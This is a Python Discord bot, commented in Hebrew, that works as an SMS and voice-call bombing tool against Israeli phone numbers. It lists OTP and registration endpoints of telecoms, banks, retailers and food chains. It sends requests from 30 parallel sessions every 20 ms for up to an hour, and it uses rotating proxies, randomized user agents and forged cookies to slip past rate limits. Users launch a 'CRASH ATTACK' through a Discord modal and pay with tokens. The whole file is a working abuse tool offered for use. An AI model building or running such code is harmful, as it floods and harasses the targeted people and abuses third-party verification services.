import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import random
import os
import sys
from motor.motor_asyncio import AsyncIOMotorClient
from datetime import datetime, timedelta
import logging
import json
import itertools
import time
import hashlib
import secrets
from collections import deque

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

MONGO_URI = os.getenv("MONGO_URI")
TOKEN = os.getenv("DISCORD_TOKEN")

if not MONGO_URI or not TOKEN:
    logging.error("❌ Missing environment variables!")
    sys.exit(1)

# התחברות ל-MongoDB
try:
    cluster = AsyncIOMotorClient(MONGO_URI)
    db = cluster["cyberbot"]
    users_col = db["users"]
    logging.info("✅ Connected to MongoDB on Railway")
except Exception as e:
    logging.error(f"❌ Failed to connect to MongoDB: {e}")
    sys.exit(1)

# ========== PROXY MANAGER ==========
class ProxyManager:
    def __init__(self):
        self.proxies = self._load_proxies()
        self.proxy_stats = {p: {"success": 0, "fail": 0} for p in self.proxies}
        self.current_proxy = None
        self.lock = asyncio.Lock()
        self.last_rotation = time.time()
        self.rotation_interval = 15
    
    def _load_proxies(self):
        """טעינת פרוקסים"""
        return [
            f"http://185.162.230.{i}:80" for i in range(100, 250, 2)
        ] + [
            f"http://185.162.231.{i}:80" for i in range(100, 250, 2)
        ] + [
            f"http://103.153.39.{i}:80" for i in range(26, 250, 32)
        ]
    
    async def get_proxy(self):
        async with self.lock:
            if time.time() - self.last_rotation > self.rotation_interval:
                self.current_proxy = None
                self.last_rotation = time.time()
            
            if self.current_proxy and self.proxy_stats[self.current_proxy]["fail"] < 2:
                return self.current_proxy
            
            available = [p for p in self.proxies if self.proxy_stats[p]["fail"] < 3]
            if available:
                self.current_proxy = random.choice(available)
                return self.current_proxy
            
            self.current_proxy = random.choice(self.proxies)
            return self.current_proxy
    
    async def report_success(self, proxy):
        async with self.lock:
            if proxy in self.proxy_stats:
                self.proxy_stats[proxy]["success"] += 1
    
    async def report_failure(self, proxy):
        async with self.lock:
            if proxy in self.proxy_stats:
                self.proxy_stats[proxy]["fail"] += 1

# ========== COOKIE CLEANER ==========
class CookieCleaner:
    def __init__(self):
        self.cookies = {}
        self.last_cleanup = time.time()
    
    def generate_fresh_cookies(self, domain):
        return {
            f"session_{domain}": secrets.token_hex(16),
            f"csrf_{domain}": secrets.token_hex(8),
            "_ga": f"GA1.2.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
            "_gid": f"GA1.2.{random.randint(1000000000, 9999999999)}.{int(time.time())}"
        }
    
    def get_headers_with_cookies(self, domain):
        if time.time() - self.last_cleanup > 60:
            self.cookies = {}
            self.last_cleanup = time.time()
        
        if domain not in self.cookies:
            self.cookies[domain] = self.generate_fresh_cookies(domain)
        
        cookie_str = "; ".join([f"{k}={v}" for k, v in self.cookies[domain].items()])
        return {
            "Cookie": cookie_str,
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache"
        }

# ========== BOT CLASS ==========
class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.start_time = datetime.now()
        self.active_attacks = {}
        self.proxy_manager = ProxyManager()
        self.cookie_cleaner = CookieCleaner()
    
    async def setup_hook(self):
        await self.tree.sync()
        logging.info(f"🔱 OMNI-TOTAL-WAR BOT IS ONLINE")

bot = CyberBot()

# ========== USER AGENTS ==========
USER_AGENTS = [
    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120,146)}.0.0.0 Safari/537.36",
    f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120,146)}.0.0.0 Safari/537.36",
    f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15,17)}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{random.randint(15,17)}.0 Mobile/15E148 Safari/604.1",
]

# ========== CELLCOM API ==========
CELLCOM_API = {
    "name": "Cellcom",
    "url": "https://digital-api.cellcom.co.il/api/otp/ResendLoginStep1",
    "method": "PUT",
    "headers": {
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Origin": "https://cellcom.co.il",
        "clientid": "CellcomWebApp",
        "deviceid": lambda: "web_" + secrets.token_hex(16),
        "sessionid": lambda: "sess_" + secrets.token_hex(24)
    },
    "data": {"phone": "PHONE"}
}

# ========== MAGENTO APIS ==========
MAGENTO_APIS = [
    {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Onot", "url": "https://www.onot.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento"},
    {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento"},
    {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Adika", "url": "https://www.adikastyle.com/customer/ajax/post/", "type": "magento"},
    {"name": "Weshoes", "url": "https://www.weshoes.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "NineWest", "url": "https://www.ninewest.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Golf", "url": "https://www.golf-il.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Nike", "url": "https://www.nike.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Adidas", "url": "https://www.adidas.co.il/customer/ajax/post/", "type": "magento"},
    {"name": "Puma", "url": "https://www.puma.co.il/customer/ajax/post/", "type": "magento"},
]

# ========== SMS APIS ==========
SMS_APIS = [
    CELLCOM_API,
    {"name": "Partner", "url": "https://www.partner.co.il/api/register", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Pelephone", "url": "https://www.pelephone.co.il/api/auth", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Hot", "url": "https://www.hotmobile.co.il/api/verify", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Bezeq", "url": "https://www.bezeq.co.il/api/auth", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "method": "POST", "data": {"phone": "PHONE_RAW"}},
    {"name": "RamiLevi", "url": "https://www.rami-levy.co.il/api/auth/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "10bis", "url": "https://www.10bis.co.il/api/register", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Wolt", "url": "https://www.wolt.com/api/v1/verify", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register", "method": "POST", "data": {"phone": "PHONE", "action": "send_sms"}},
    {"name": "Pango", "url": "https://api.pango.co.il/auth/otp", "method": "POST", "data": {"phoneNumber": "PHONE_RAW"}},
    {"name": "Dominos", "url": "https://www.dominos.co.il/api/auth/sms", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "McDonalds", "url": "https://www.mcdonalds.co.il/api/verify", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "BurgerKing", "url": "https://www.burgerking.co.il/api/auth", "method": "POST", "data": {"phone": "PHONE"}},
]

# ========== VOICE APIS ==========
VOICE_APIS = [
    {"name": "Hapoalim_Voice", "url": "https://login.bankhapoalim.co.il/api/otp/send", "method": "POST", "data": {"phone": "PHONE", "sendVoice": True}},
    {"name": "Leumi_Voice", "url": "https://api.leumi.co.il/api/otp/send", "method": "POST", "data": {"phone": "PHONE", "channel": "voice"}},
    {"name": "Discount_Voice", "url": "https://api.discountbank.co.il/auth/otp", "method": "POST", "data": {"phone": "PHONE_RAW", "method": "voice"}},
    {"name": "Cellcom_Voice", "url": "https://digital-api.cellcom.co.il/api/otp/VoiceCall", "method": "POST", "data": {"phone": "PHONE"}},
    {"name": "Shufersal_Voice", "url": "https://www.shufersal.co.il/api/v1/auth/voice", "method": "POST", "data": {"phone": "PHONE_RAW"}},
]

ALL_APIS = MAGENTO_APIS + SMS_APIS + VOICE_APIS

# ========== פונקציות שליחה ==========
async def send_magento(session, url, phone_raw, proxy):
    """שליחת מג'נטו"""
    data = {
        "type": "login",
        "telephone": phone_raw,
        "bot_validation": 1
    }
    
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    # מוסיף קוקיז
    domain = url.split('/')[2]
    headers.update(bot.cookie_cleaner.get_headers_with_cookies(domain))
    
    try:
        async with session.post(url, data=data, headers=headers, proxy=proxy, timeout=2) as resp:
            return resp.status in [200, 201, 202]
    except:
        return False

async def send_api(session, api, phone, phone_raw, proxy):
    """שליחת API"""
    try:
        domain = api["url"].split('/')[2]
        
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json"
        }
        
        if "headers" in api:
            for k, v in api["headers"].items():
                if callable(v):
                    headers[k] = v()
                else:
                    headers[k] = v
        
        # מוסיף קוקיז
        headers.update(bot.cookie_cleaner.get_headers_with_cookies(domain))
        
        method = api.get("method", "POST").lower()
        
        if "data" in api:
            headers["Content-Type"] = "application/json"
            data_str = json.dumps(api["data"])
            data_str = data_str.replace("PHONE", phone)
            data_str = data_str.replace("PHONE_RAW", phone_raw)
            data = json.loads(data_str)
            
            async with session.request(method, api["url"], json=data, headers=headers, proxy=proxy, timeout=2) as resp:
                return resp.status in [200, 201, 202, 204]
        else:
            async with session.request(method, api["url"], headers=headers, proxy=proxy, timeout=2) as resp:
                return resp.status in [200, 201, 202, 204]
    except:
        return False

# ========== מתקפה ==========
async def run_attack(phone, duration_mins, attack_type, user_id, interaction, attack_id):
    phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
    
    end_time = datetime.now() + timedelta(minutes=duration_mins)
    total_sent = 0
    rounds = 0
    
    if attack_type == "magento":
        apis = MAGENTO_APIS
    elif attack_type == "sms":
        apis = SMS_APIS
    elif attack_type == "voice":
        apis = VOICE_APIS
    else:
        apis = ALL_APIS
    
    # רק הודעה אחת בהתחלה
    await interaction.followup.send(
        f"💥 **ATTACK STARTED**\n📱 {phone}\n⏱️ {duration_mins} דקות\n🎯 {len(apis)} APIs",
        ephemeral=True
    )
    
    # 30 סשנים
    sessions = [aiohttp.ClientSession() for _ in range(30)]
    
    try:
        while datetime.now() < end_time:
            if attack_id in bot.active_attacks and not bot.active_attacks[attack_id]:
                break
            
            rounds += 1
            tasks = []
            proxy = await bot.proxy_manager.get_proxy()
            
            for session in sessions:
                for api in apis:
                    if api.get("type") == "magento":
                        tasks.append(send_magento(session, api["url"], phone_raw, proxy))
                    else:
                        tasks.append(send_api(session, api, phone, phone_raw, proxy))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            round_sent = sum(1 for r in results if r is True)
            total_sent += round_sent
            
            # עדכון כל 10 שניות
            if rounds % 100 == 0:
                seconds = int((datetime.now() - (end_time - timedelta(minutes=duration_mins))).total_seconds())
                await interaction.followup.send(f"📊 {seconds}s: {total_sent} הודעות", ephemeral=True)
            
            await asyncio.sleep(0.02)  # 20ms
    
    finally:
        for session in sessions:
            await session.close()
    
    if attack_id in bot.active_attacks:
        del bot.active_attacks[attack_id]
    
    await interaction.followup.send(f"✅ **FINISHED**\n📊 סה\"כ: {total_sent}", ephemeral=True)

# ========== פקודות ==========
@bot.tree.command(name="check", description="בדוק APIs")
async def check_command(interaction: discord.Interaction):
    await interaction.response.send_message("🔍 בודק...", ephemeral=True)
    
    test_phone = "972501234567"
    test_raw = "0501234567"
    
    working = []
    
    async with aiohttp.ClientSession() as session:
        for api in ALL_APIS[:20]:
            if api.get("type") == "magento":
                success = await send_magento(session, api["url"], test_raw, None)
            else:
                success = await send_api(session, api, test_phone, test_raw, None)
            
            if success:
                working.append(api["name"])
            
            await asyncio.sleep(0.1)
    
    await interaction.followup.send(f"✅ **{len(working)}** עובדים:\n" + "\n".join(working[:10]), ephemeral=True)

@bot.tree.command(name="stop", description="עצור הכל")
async def stop_command(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    stopped = 0
    for attack_id in list(bot.active_attacks.keys()):
        if attack_id.startswith(user_id):
            bot.active_attacks[attack_id] = False
            stopped += 1
    await interaction.response.send_message(f"🛑 עצרתי {stopped}", ephemeral=True)

# ========== ממשק משתמש ==========
class AttackModal(ui.Modal, title="💥 CRASH ATTACK"):
    phone = ui.TextInput(label="📱 טלפון", placeholder="972501234567")
    duration = ui.TextInput(label="⏱️ דקות", default="3")
    attack_type = ui.TextInput(label="🎯 סוג", default="all")

    async def on_submit(self, interaction: discord.Interaction):
        phone = self.phone.value.strip()
        attack_type = self.attack_type.value.strip().lower()
        
        if not phone.startswith("972"):
            await interaction.response.send_message("❌ מספר חייב 972", ephemeral=True)
            return
        
        try:
            duration = int(self.duration.value)
            if duration < 1 or duration > 60:
                await interaction.response.send_message("❌ 1-60 דקות", ephemeral=True)
                return
        except:
            await interaction.response.send_message("❌ מספר לא תקין", ephemeral=True)
            return
        
        user_id = str(interaction.user.id)
        user_doc = await users_col.find_one({"user_id": user_id})
        
        if not user_doc:
            await users_col.insert_one({"user_id": user_id, "tokens": 1000})
            user_doc = {"tokens": 1000}
        
        if user_doc.get("tokens", 0) < 1:
            await interaction.response.send_message("❌ אין טוקנים", ephemeral=True)
            return
        
        await users_col.update_one({"user_id": user_id}, {"$inc": {"tokens": -1}})
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        bot.active_attacks[attack_id] = True
        
        # תשובה ראשונית
        await interaction.response.send_message(
            f"💥 **CRASH ACTIVATED!**\n📱 {phone}\n💎 נותרו: {user_doc['tokens']-1}",
            ephemeral=True
        )
        
        # הפעלת המתקפה
        asyncio.create_task(run_attack(phone, duration, attack_type, user_id, interaction, attack_id))

class MainView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)
    
    @discord.ui.button(label="💥 CRASH", style=discord.ButtonStyle.danger)
    async def attack_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(AttackModal())
    
    @discord.ui.button(label="🔍 CHECK", style=discord.ButtonStyle.secondary)
    async def check_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await check_command(interaction)
    
    @discord.ui.button(label="🛑 STOP", style=discord.ButtonStyle.secondary)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await stop_command(interaction)

@bot.tree.command(name="setup", description="פאנל שליטה")
async def setup(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    user_doc = await users_col.find_one({"user_id": user_id})
    
    if not user_doc:
        await users_col.insert_one({"user_id": user_id, "tokens": 10000})
        tokens = 10000
    else:
        tokens = user_doc.get("tokens", 0)
    
    active = len([a for a in bot.active_attacks if a.startswith(user_id) and bot.active_attacks[a]])
    
    embed = discord.Embed(
        title="💥 CRASH EDITION",
        description=f"{len(ALL_APIS)} APIs | 30 סשנים | 20ms",
        color=0xff0000
    )
    embed.add_field(name="💎 טוקנים", value=f"**{tokens}**")
    embed.add_field(name="🎯 פעיל", value=active)
    
    view = MainView()
    
    # רק תשובה אחת
    await interaction.response.send_message(embed=embed, view=view)

if __name__ == "__main__":
    logging.info(f"💥 STARTING with {len(ALL_APIS)} APIs")
    bot.run(TOKEN)
